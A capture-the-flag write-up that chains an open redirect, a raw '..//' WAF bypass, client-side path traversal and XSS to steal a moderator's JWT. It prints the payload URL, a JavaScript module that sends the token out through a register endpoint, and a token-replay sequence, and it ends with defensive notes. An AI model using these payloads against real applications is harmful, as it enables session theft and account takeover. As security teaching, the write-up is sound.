---
title: FurHire - Open Redirect + CSPT to XSS + Token Replay
cve: CVE-2025-4123
tags:
  - bugforge
  - cspt
  - open-redirect
  - xss
  - waf-bypass
  - token-replay
  - chain
  - cve-2025-4123
aliases:
  - "/bugforge/furhire-open-redirect-cspt/"
  - "/BugForge/FurHire---Open-Redirect-CSPT"
---
- A second FurHire challenge, and a different chain from the [CSPT-to-ATO writeup](/bugforge/bf-furhire-cspt/). This one is modelled on **Grafana CVE-2025-4123** which is the `open redirect + client-side path traversal + XSS` bug  and it ends with a twist most could miss.
- Four primitives stitched together: an open redirect behind a slash-blocking WAF, a client-side path traversal in a plugin loader, a script-injection sink that only executes JS from the right content-type, and a stolen staff token that reveals the flag in a **response header**.

## TL;DR

```
support ticket -> moderator's browser opens /apps?app=<CSPT payload>
   -> apps.js fetches /api/apps/../../../public/redirect?url=/x/..//cdn.jsdelivr.net/<repo>/manifest.json%23junk=/manifest
   -> browser normalizes the ../ -> hits the open redirect
   -> /public/redirect 302s to //cdn.jsdelivr.net/... (protocol-relative, off-origin)
   -> apps.js reads manifest.module -> <script src=jsdelivr module.js>
   -> module runs in the moderator's browser WITH their staff token
   -> module reads the token + profile, exfils via POST /api/register (same-origin, CSP-proof)
   -> attacker logs in as the exfil user, recovers the staff JWT
   -> replay the staff token against ANY endpoint -> flag is in the X-Flag RESPONSE HEADER
```

## Recon

FurHire is a pet job board. Express SSR with inline `<script>` blocks, JWTs in `localStorage`, Socket.io for notifications, two roles (`user`, `recruiter`). The interesting surface is an "Insights Apps" feature and its "App Studio" - a plugin system that publishes a manifest + JS module to an internal content host.

### Hint Decode

The challenge points at **CVE-2025-4123**, the Grafana chain: an open redirect in a static handler, a client-side path traversal that loads a plugin, and cross-origin script execution that runs attacker JS in a victim's authenticated session. FurHire simulates the same shape on Express instead of Go.

### Endpoint Map

```
POST /api/register                 - mass assignment: role field works for "recruiter"
POST /api/login
GET  /api/verify-token             - {id, username, email, full_name, role}
GET  /api/jobs, /api/jobs/:id, /api/jobs/:id/applicants
POST /api/jobs/:id/apply
GET  /api/my-applications, /api/my-jobs
GET  /api/profile                  - {user, company}
PUT  /api/company
GET  /api/apps/:name/manifest      - "pipeline-insights" -> {name, module}; others 404
POST /api/studio/content           - publishes manifest+module to internal content host
GET  /api/studio/hits              - render-beacon readback ({hits:[]})
POST /api/support/tickets          - {url, description}; a moderator opens the url in a browser
GET  /public/redirect?url=<value>  - custom Express route (the open redirect)
GET  /public/js/apps.js            - the plugin loader (the CSPT sink)
```

### The Two Pages That Matter

The `/apps` page loads `/public/js/apps.js`. That script is the entire attack surface:

```javascript
!function () {
  "use strict";
  document.addEventListener("DOMContentLoaded", function () {
    var e = localStorage.getItem("token");
    if (e) {
      var t = new URLSearchParams(window.location.search).get("app") || "pipeline-insights",
          n = "/api/apps/" + t + "/manifest";
      fetch(n, { headers: { Authorization: "Bearer " + e } })
        .then(function (e) { return e.json() })
        .then(function (e) {
          if (e && e.module) {
            var t = document.createElement("script");
            t.src = e.module;                  // <-- attacker-controlled script src
            document.body.appendChild(t);
          }
        }).catch(function () {})
    }
  })
}();
```

Every property of a client-side path traversal into a script sink:

| Property                     | Value                                                       |
| ---------------------------- | ----------------------------------------------------------- |
| URL built by string concat   | `"/api/apps/" + app + "/manifest"`                          |
| Input from URL, decoded      | `URLSearchParams.get("app")`                                |
| Result becomes `<script src>` | `t.src = manifest.module`                                  |
| Runs with victim's token     | gated by `if (localStorage.getItem("token"))`               |
| Auto-fires on load           | `DOMContentLoaded`                                          |

- The `/support` endpoint takes a `url` path field. 
- A moderator (a logged-in `staff` user, in a real browser, with their token in `localStorage`) opens that URL.. that is our victim. 
- So if we can make the moderator load `/apps?app=<something that loads our JS>`, our JS runs as **staff**.

The problem: `apps.js` builds `/api/apps/<app>/manifest` on the **app host**. A traversal like `app=../../studio/manifest.json` just resolves to a path *on the same origin*, which 404s. We need a way to make that same-origin fetch end up pulling an **attacker-controlled** manifest. That is what the open redirect is for.

## Primitive 1 - The Open Redirect (and its WAF)

FurHire ships a custom redirect route:

```http
GET /public/redirect?url=/dashboard HTTP/1.1
```
```http
HTTP/1.1 302 Found
Location: /dashboard
```

Try to send it off-origin and it refuses:

```http
GET /public/redirect?url=https://example.com HTTP/1.1
```
```http
HTTP/1.1 400 Bad Request
```

The server blocks values starting with `http://` / `https://`. And a WAF/proxy in front blocks **encoded** slashes in the path - `%2F`, `%5C`, `%25`, `%3F` all return a headerless `400`. So the obvious `//example.com` open-redirect payload is awkward to smuggle.

### The Bypass - Raw `..//`

- The WAF only inspects **encoded** slashes. 
- Raw `..` and raw `//` pass straight through. So:

```http
GET /public/redirect?url=/x/..//example.com/ HTTP/1.1
```
```http
HTTP/1.1 302 Found
Location: //example.com/
```

What happened: `/x/..` collapses to nothing, leaving `//example.com/` - a **protocol-relative URL**, which the browser resolves to `https://example.com/`. The `url=` value started with a `/` (so the server's "no external URL" check passed), but after path collapse it is an off-origin redirect.

> Lesson: a WAF that blocks *encoded* slashes very often lets *raw* `..//` through. Always try the raw form before giving up on a slash-filtered redirect.

And a second lesson worth its own line: the redirect lives at `/public/redirect`, mounted right next to the static-file handler. An earlier pass fuzzed 30+ redirect route names at web root (`/redirect`, `/go`, `/goto`, `/callback`...) and found nothing, because the route was under the `/public/` prefix everyone had mentally written off as "just static files." A custom route can share a prefix with a static mount. Fuzz redirect/callback names under every prefix, not just `/`.

## Primitive 2 - CSPT Through the Redirect

Now chain it. `apps.js` builds `/api/apps/<app>/manifest`. We want the fetch to hit `/public/redirect?url=...` instead, and we want the trailing `/manifest` to disappear.

Count segments to climb from `/api/apps/<app>`:

```
/api/apps/<app>/manifest
     ^^^^ ^^^^
     climb "apps" and "api" -> ../../../ lands at web root
```

So `app = ../../../public/redirect?url=/x/..//<host>/manifest.json`. The browser normalizes the `../../../` client-side, producing:

```
/public/redirect?url=/x/..//<host>/manifest.json/manifest
```

That trailing `/manifest` (the loader's own suffix) would get bundled into our redirect target and break it. Kill it with a `%23` (encoded `#`):

```
app=../../../public/redirect?url=/x/..//<host>/manifest.json%23junk=
```

`URLSearchParams` decodes `%23` to `#`, so the constructed fetch URL becomes:

```
/api/apps/../../../public/redirect?url=/x/..//<host>/manifest.json#junk=/manifest
```

Everything after `#` is a **fragment** - it is not sent to the server. The request is exactly `/public/redirect?url=/x/..//<host>/manifest.json`, which 302s to `//<host>/manifest.json`. `fetch` follows the redirect, gets our JSON, reads `.module`, and injects `<script src=...>`.

> `%23` vs `%26`: an encoded `&` (`%26junk=`) works when the exfil host serves content at any path (e.g. webhook.site), because the trailing `/manifest` just becomes a dead query param. For a gist/CDN that 404s on `/manifest.json/manifest`, use `%23` so the suffix is dropped entirely.

## Primitive 3 - The Content-Type Trap

We control the manifest and the module. The manifest is trivial JSON:

```json
{ "name": "phantom", "module": "https://cdn.jsdelivr.net/gh/<user>/<repo>@<commit>/module.js" }
```

The catch is *where you host the module*. The obvious choice... a raw GitHub gist which **silently fails**:

```
GET https://gist.githubusercontent.com/<user>/<id>/raw/module.js
content-type: text/plain; charset=utf-8
x-content-type-options: nosniff
```

- `nosniff` + `text/plain` means the browser **refuses to execute** the file as a script. 
- No error in the console you can see from the outside; the `<script>` element just does nothing. 
- The whole chain fires perfectly and produces zero effect.

**jsdelivr** serves the same repo file with the right headers:

```
GET https://cdn.jsdelivr.net/gh/<user>/<repo>@<commit>/module.js
content-type: application/javascript; charset=utf-8
access-control-allow-origin: *
```

- `application/javascript` executes; `ACAO: *` keeps cross-origin loading happy. 
- Commit-pin the URL (`@<sha>`) so jsdelivr's cache doesn't serve a stale copy while you iterate.

- When the chain *should* fire but nothing happens, check the script host's `content-type` before re-debugging the traversal.

## Primitive 4 - Exfil via the App's Own Register Endpoint

The module runs in the moderator's browser. We need to get data *out*. An `Image().src` / `fetch()` beacon to an external collector is the reflex - but the content host may ship `Content-Security-Policy: default-src 'none'`, which kills any cross-origin request. So use the target's **own** write endpoint as the exfil channel:

```javascript
(function () {
  var t = localStorage.getItem("token") || "NOTOKEN";
  function reg(uname, blob) {
    fetch("/api/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: uname, password: "flag123",
        email: uname + "@x.com",
        full_name: String(blob).slice(0, 240)   // stored field = our exfil buffer
      })
    });
  }
  // JWTs are long - chunk across two users
  reg("pe_tokA", "TOKA:" + t.slice(0, 230));
  reg("pe_tokB", "TOKB:" + t.slice(230));
  // also grab the moderator's identity
  fetch("/api/profile", { headers: { Authorization: "Bearer " + t } })
    .then(function (r) { return r.text() })
    .then(function (b) { reg("pe_prof", "PROF:" + b) });
})();
```

`POST /api/register` is same-origin, so it sails through any CSP. The stolen data lands in the `full_name` field of a user we created. To read it back, just log in as that user (`password: flag123`) and read `full_name`:

```http
POST /api/login  {"username":"pe_tokA","password":"flag123"}
```
```json
{"user":{"username":"pe_tokA","full_name":"TOKA:eyJhbGciOiJIUzI1NiIs...moderator JWT...","role":"user"}, ...}
```

Reassemble `TOKA` + `TOKB` and you hold the moderator's JWT. Decode it:

```json
{"id":6,"username":"moderation_review","role":"staff","iat":...}
```

A `role: staff` token. Now the finish.

## Primitive 5 - The Flag Is in a Response Header

This is where it clicks. With the staff token in hand, the instinct is to look for a staff-only *endpoint* that returns the flag in its body. So you try them all:

```
GET /flag                 -> 404
GET /api/flag             -> 404
GET /api/admin/flag       -> 404
GET /api/staff/flag       -> 404
GET /api/admin/users      -> 404
```

- Every path 404s, even with the staff token.
- The flag is not at any path - it is in an `X-Flag` response header present on **every** response (including those 404s) the instant the request carries a `role=staff` token:

```http
GET /api/verify-token HTTP/1.1
Authorization: Bearer <moderator staff JWT>
```
```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Flag: bug{7uSoNaRTlu2ew7yL0TprQfMiPGi4NbB9}
X-Powered-By: Express

{"user":{"id":6,"username":"moderation_review","role":"staff", ...}}
```

> **The core lesson of the whole challenge:** after you steal or forge a privileged token, *replay it and diff the response HEADERS* before hunting for the "right" body path. A privilege-gated secret often rides a header on every response. Tooling makes this easy to miss - Caido's `caido_send_request` default fingerprint hides response headers (status + title + word-count only), so you have to explicitly inspect the full header set. (This brought updates to my Caido MCP!) A blanket "authed vs unauthed header diff" on one benign endpoint is a cheap, high-signal first move the moment you hold any elevated credential.

## Step-by-Step Walkthrough

### 0. Register an attacker user

```http
POST /api/register  {"username":"phantom_v2","password":"Phantom!2026x","email":"phantom_v2@x.com"}
```
```json
{"token":"eyJ...","user":{"id":8,"username":"phantom_v2","role":"user"}}
```

### 1. Host the module + manifest on jsdelivr

Create a public GitHub repo, push `module.js` (the exfil module above), grab the commit SHA, then push a `manifest.json` pointing at the module's jsdelivr URL:

```json
{ "name": "phantom", "module": "https://cdn.jsdelivr.net/gh/<user>/<repo>@<sha>/module.js" }
```

Verify both serve with the right content-type:

```bash
curl -sI "https://cdn.jsdelivr.net/gh/<user>/<repo>@<sha>/module.js" | grep -i content-type
# content-type: application/javascript; charset=utf-8
```

### 2. Confirm the redirect resolves to the CDN

```http
GET /public/redirect?url=/x/..//cdn.jsdelivr.net/gh/<user>/<repo>@<sha>/manifest.json HTTP/1.1
```
```http
HTTP/1.1 302 Found
Location: //cdn.jsdelivr.net/gh/<user>/<repo>@<sha>/manifest.json
```

### 3. Fire the CSPT via the support form

```http
POST /api/support/tickets HTTP/1.1
Authorization: Bearer <attacker token>
Content-Type: application/json

{"url":"/apps?app=../../../public/redirect?url=/x/..//cdn.jsdelivr.net/gh/<user>/<repo>@<sha>/manifest.json%23junk=","description":"My insights widget will not load"}
```
```json
{"message":"Thanks! A moderator will review this shortly."}
```

### 4. Wait for the moderator (~2-5 min)

The moderator opens `/apps?app=...` in a real browser with their staff token in `localStorage`. `apps.js` runs, follows the redirect to the CDN manifest, loads the module, and the module registers `pe_tokA` / `pe_tokB` / `pe_prof` carrying the stolen staff JWT.

### 5. Recover the staff token

```http
POST /api/login  {"username":"pe_tokA","password":"flag123"}
POST /api/login  {"username":"pe_tokB","password":"flag123"}
```

Concatenate the `full_name` chunks -> the moderator's `role:staff` JWT.

### 6. Replay the staff token and read the header

```http
GET /api/verify-token HTTP/1.1
Authorization: Bearer <moderator staff JWT>
```
```
X-Flag: bug{7uSoNaRTlu2ew7yL0TprQfMiPGi4NbB9}
```

## Attack Chain Diagram

```
[1] attacker POST /api/support/tickets
      url=/apps?app=../../../public/redirect?url=/x/..//cdn.jsdelivr.net/<repo>/manifest.json%23junk=
                |
                v
[2] moderator (role=staff) opens the URL in a browser (token in localStorage)
                |
                v
[3] /public/js/apps.js:
      fetch("/api/apps/../../../public/redirect?url=/x/..//cdn.jsdelivr.net/.../manifest.json#junk=/manifest")
      browser normalizes ../ and drops the #fragment ->
      GET /public/redirect?url=/x/..//cdn.jsdelivr.net/.../manifest.json
                |
                v
[4] 302 Location: //cdn.jsdelivr.net/.../manifest.json   (raw ..// WAF bypass, protocol-relative)
      fetch follows -> manifest.module -> <script src=jsdelivr module.js>   (application/javascript executes)
                |
                v
[5] module runs as staff: reads token + /api/profile,
      exfils via POST /api/register (full_name = stolen data, same-origin, CSP-proof)
                |
                v
[6] attacker logs in as the exfil users -> recovers moderator staff JWT
                |
                v
[7] replay staff token -> X-Flag response header on every response -> flag
```

## Why This Worked - The Bugs

- **Open redirect behind an encoded-slash-only WAF.** The filter checked `%2F`/`%5C` but not raw `..//`, so `/x/..//host` collapses to a protocol-relative off-origin redirect. And it lived under `/public/`, so route-name fuzzing at web root missed it.
- **CSPT in the plugin loader.** `apps.js` concatenates an unsanitized query param into a fetch URL and turns the response's `.module` into a `<script src>`. The `%23` fragment trick discards the loader's own `/manifest` suffix so the fetch resolves exactly where we want.
- **Content-type-gated script execution.** Raw gists (`text/plain` + `nosniff`) refuse to run; jsdelivr (`application/javascript`) executes. The chain looks identical either way from the attacker's side - only the script host's headers decide whether anything happens.
- **Same-origin exfil beats CSP.** Using the app's own `POST /api/register` as the exfil buffer sidesteps `default-src 'none'` entirely; no external collector, no CSP fight.
- **Header-delivered secret.** The flag was gated on `role=staff` and returned in an `X-Flag` response header on every response, so path-hunting was a permanent dead end. The correct move after stealing a privileged token is to replay it and read the headers.

## Defensive Notes

- **Redirect validation must normalize before checking.** Reject any `url` that resolves to an off-origin target *after* path collapse, not just those starting with `http`. Block protocol-relative `//` explicitly. Do slash-decoding in the app, not only at the WAF - a WAF that only catches encoded slashes is trivially bypassed with raw `..//`.
- **Never build a `<script src>` from a URL-derived value.** The plugin loader should resolve a fixed allowlist of app names to fixed module paths, never concatenate a user-controlled param into a fetch URL, and never redirect a manifest fetch off-origin.
- **A bot/moderator that opens user-supplied URLs is a confused deputy.** It carries a privileged session into arbitrary pages. Sandbox it (no privileged token, isolated origin) or refuse to navigate to same-app authenticated routes.
- **Don't put secrets in response headers keyed on role.** A header set on every response (including error responses) leaks to anything that can obtain the gating token.
